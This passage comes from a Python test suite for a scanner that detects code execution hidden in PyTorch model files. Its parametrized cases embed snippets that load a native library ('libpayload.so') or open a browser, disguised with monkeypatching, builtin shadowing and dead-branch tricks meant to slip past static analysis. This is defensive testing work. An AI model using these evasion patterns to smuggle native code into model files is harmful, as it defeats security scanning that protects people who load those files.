                b"import webbrowser as wb\n",
                b"for _ in [0]:\n    if False:\n        continue\n    wb.open = print\n"
                b"opener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\nimport builtins\nclass Safe:\n"
                b"    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
                b"builtins.dict = Safe\nfrom builtins import dict as real_dict\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nclass Safe:\n"
                b"    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
                b"real_dict = Safe\nenabled = True\nif enabled:\n"
                b"    from builtins import dict as real_dict\n    real_dict = Safe\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"class Safe:\n    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
                b"real_dict = Safe\nenabled = True\nif enabled:\n"
                b"    from builtins import dict as real_dict\n    real_dict = Safe\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"class Safe:\n    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
                b"real_dict = Safe\nenabled = True\nglobals()['enabled'] = False\nif enabled:\n"
                b"    from builtins import dict as real_dict\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"class Safe:\n    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
                b"real_dict = Safe\nenabled = False\nglobals = lambda: {}\n"
                b"globals()['enabled'] = True\nif enabled:\n    from builtins import dict as real_dict\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"class Safe:\n    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
                b"real_dict = Safe\nenabled = True\nglobals = lambda: {}\ndel globals\n"
                b"globals()['enabled'] = False\nif enabled:\n    from builtins import dict as real_dict\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"class Safe:\n    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
                b"real_dict = Safe\nenabled = True\nglobals()['globals'] = lambda: {}\ndel globals\n"
                b"globals()['enabled'] = False\nif enabled:\n    from builtins import dict as real_dict\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_preserves_safe_late_typed_member_overwrite(
        self, prefix: bytes, late_state: bytes, unexpected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xff" + prefix + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == unexpected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("prefix", "late_state", "expected_pattern"),
        [
            (
                b"import webbrowser as wb\n",
                b"opener = wb.open\nwb.open = print\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"loader = c.CDLL\nc.CDLL = print\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"loader = c.cdll\nc.cdll = print\nloader.msvcrt\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nwb.open = original\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nc.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nprint = original\nwb.open = print\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nprint = original\nc.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nsetattr = print\nsetattr(wb, 'open', print)\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"import builtins\noriginal = wb.open\nbuiltins.setattr = print\nsetattr(wb, 'open', print)\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"False and vars(wb).update(open=print)\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"False and c.__dict__.__setitem__('CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"noop = lambda: vars(wb).update(open=print)\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"import builtins\noriginal = wb.open\nwb.open = print\nbuiltins.setattr(wb, 'open', original)\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nwb.__dict__['op' + 'en'] = original\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nvars(c).update(**{'CD' + 'LL': original})\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nc.__dict__.update([('CDLL', original)])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndict.update(c.__dict__, [('CDLL', original)])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nc.__dict__.__ior__({'CDLL': original})\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndict.__ior__(c.__dict__, {'CDLL': original})\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL\n"
                b"dict.setdefault(c.__dict__, 'CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndel c.__dict__['CDLL']\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nc.__dict__.pop('CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL\n"
                b"put = c.__dict__.setdefault\nput('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL; c.__dict__.setdefault('CDLL', original)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndict.__setitem__(c.__dict__, 'CDLL', original)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nrestore = c.__dict__.update\n"
                b"restore(CDLL=original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nput = c.__dict__.__setitem__\n"
                b"put('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndel vars(c)['CDLL']\n"
                b"vars(c).setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL\nput = dict.setdefault\n"
                b"put(c.__dict__, 'CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nput = wb.__dict__.__setitem__\n"
                b"put('open', original)\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndict.__delitem__(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nremove = c.__dict__.pop\nremove('CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nremove = vars(c).pop\nremove('CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nremove = dict.pop\nremove(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndelattr(c, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\ndict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\noriginal = c.CDLL\nc.CDLL = print\n"
                b"builtins.dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\noriginal = c.CDLL\nc.CDLL = print\n"
                b"builtins.dict.__delitem__(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\noriginal = c.CDLL\nc.CDLL = print\n"
                b"real_dict = builtins.dict\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\noriginal = c.CDLL\nc.CDLL = print\n"
                b"real_dict = builtins.dict\nreal_dict.__delitem__(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\noriginal = c.CDLL\nc.CDLL = print\n"
                b"real_dict = builtins.dict\nremove = real_dict.pop\nremove(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nfrom builtins import dict as real_dict\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nfrom builtins import (\n    dict as real_dict,\n)\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nfrom builtins import (\n    dict as real_dict,\n    len as spare,\n)\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nfrom builtins import dict as real_dict, \\\n    len as spare\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nfrom builtins import (\n    dict as unused_dict,\n    dict as real_dict,\n)\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\npass; from builtins import dict as real_dict\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n0; from builtins import dict as real_dict\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nif True: from builtins import dict as real_dict\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nif True:\n    from builtins import dict as real_dict\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nenabled = True\nif enabled:\n    from builtins import dict as real_dict\n"
                b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"from builtins import (\n    dict as real_dict,\n)\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"from builtins import (\n    dict as real_dict,\n    len as spare,\n)\n"
                b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"from builtins import (\n    dict as unused_dict,\n    dict as real_dict,\n)\n"
                b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"from builtins import dict as real_dict, \\\n    len as spare\n"
                b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"from builtins import dict as real_dict; pass\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"pass; from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"0; from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"if True: from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"if True:\n    from builtins import dict as real_dict\n"
                b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"enabled = True\nif enabled:\n    from builtins import dict as real_dict\n"
                b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"enabled = False\nglobals()['enabled'] = True\nif enabled:\n"
                b"    from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"enabled = True\nglobals = lambda: {}\nglobals()['enabled'] = False\nif enabled:\n"
                b"    from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"enabled = False\nglobals = lambda: {}\ndel globals\nglobals()['enabled'] = True\nif enabled:\n"
                b"    from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
                b"enabled = False\nglobals()['globals'] = lambda: {}\ndel globals\n"
                b"globals()['enabled'] = True\nif enabled:\n    from builtins import dict as real_dict\n"
                b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\nremove = dict.pop\n"
                b"remove(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\nremove = dict.pop\n"
                b"relay = remove\nrelay(c.__dict__, 'CDLL')\n",
                b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nprint = original\nwb.open = print\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"import builtins\noriginal = wb.open\nwb.open = print\nbuiltins.setattr(\n"
                b"    wb, 'open', original\n)\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nvars(c).update(\n"
                b"    **{'CDLL': original}\n)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nif True:\n    wb.open = original\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nwb.open: object = original\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nnamespace = wb.__dict__\n"
                b"namespace.update(open=original)\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nprint, unused = original, None\nwb.open = print\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nsetattr, unused = print, None\nsetattr(wb, 'open', print)\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"import builtins\noriginal = wb.open\nbuiltins.setattr, unused = print, None\n"
                b"setattr(wb, 'open', print)\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"namespace = wb.__dict__\nnamespace, unused = {}, None\nnamespace.update(open=print)\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nimport ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nwb.open = c.CDLL = original\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.cdll\nc.cdll = print\nvars(c).update(CDLL=print, cdll=original)\n"
                b"loader = c.cdll\nloader.msvcrt\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nif False:\n    wb.open = print\nelse:\n    wb.open = original\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\ntry:\n    pass\nfinally:\n    wb.open = original\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nchanged = setattr(wb, 'open', original)\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nchanged = vars(wb).update(open=original)\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\nimport webbrowser as wb\n",
                b"original = c.CDLL\nc.CDLL = print\n(wb.open, c.CDLL) = (print, original)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nnamespace = wb.__dict__\nnamespace |= {'open': original}\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\ntry:\n    wb.open = original\nexcept Exception:\n    pass\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nfor _ in [0]:\n    wb.open = original\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nchanged = (setattr(wb, 'open', original) is None)\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nnoop = lambda arg=setattr(wb, 'open', original): arg\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\ndef noop(arg: wb.__dict__.update(open=original)):\n"
                b"    pass\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"from __future__ import annotations\nimport webbrowser as wb\n",
                b"def noop(arg: wb.__dict__.update(open=print)):\n    pass\nopener = wb.open\n"
                b"opener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"[setattr(wb, 'open', print) for _ in []]\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"[setattr(wb, 'open', print) for _ in [0] if False]\nopener = wb.open\n"
                b"opener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\n(1 == 1) and setattr(c, 'CDLL', original)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nif 1 == 1:\n    wb.open = original\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nfor _ in [0, 1]:\n    wb.open = original\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"try:\n    1 / 0\n    c.CDLL = print\nexcept ZeroDivisionError:\n    pass\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"value = wb.__dict__.update(open=print) if "
                + (b"not " * 1_000)
                + b"False else None\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"try:\n    raise RuntimeError()\nexcept (ValueError, TypeError):\n    c.CDLL = print\n"
                b"except RuntimeError:\n    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ntry:\n    raise FileNotFoundError()\n"
                b"except OSError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"try:\n    raise RuntimeError()\nexcept Exception:\n    pass\nexcept RuntimeError:\n"
                b"    c.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ntry:\n    raise PermissionError()\n"
                b"except OSError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"try:\n    for _ in [1 / 0]:\n        c.CDLL = print\nexcept ZeroDivisionError:\n    pass\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"try:\n    if True:\n        raise RuntimeError()\n    c.CDLL = print\n"
